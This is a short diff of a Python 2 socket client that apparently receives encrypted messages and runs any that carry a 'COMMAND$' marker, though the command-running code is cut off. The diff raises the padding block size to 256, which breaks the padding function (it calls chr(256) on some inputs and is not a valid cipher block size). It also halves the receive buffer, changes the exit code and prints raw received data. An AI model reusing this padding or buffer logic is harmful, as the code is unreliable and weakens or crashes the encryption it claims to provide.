@@ -17,7 +17,7 @@ port = 3435
 #port = input('Port \> ')
 _key = raw_input('Authentication Key \> ')
 
-BS = 128
+BS = 256
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
 unpad = lambda s : s[0:-ord(s[-1])]
 
@@ -61,13 +61,13 @@ def connector():
 
             for sock in read_sockets:
                 if sock == server:
-                    data = sock.recv(4096)
+                    data = sock.recv(2048)
                 if not data:
                     print("\033[1;91m[!]\033[0m Connection has ended")
-                    sys.exit(0)
+                    sys.exit(1)
                 else:
-                    print("\033[1;94m[ INFO ]\033[0m %s" % data)
-
+                    #print("\033[1;94m[ INFO ]\033[0m %s" % data)
+                    print(data)
                 # Do something when some data is present
                 if 'COMMAND$' in data:
                     # Run command
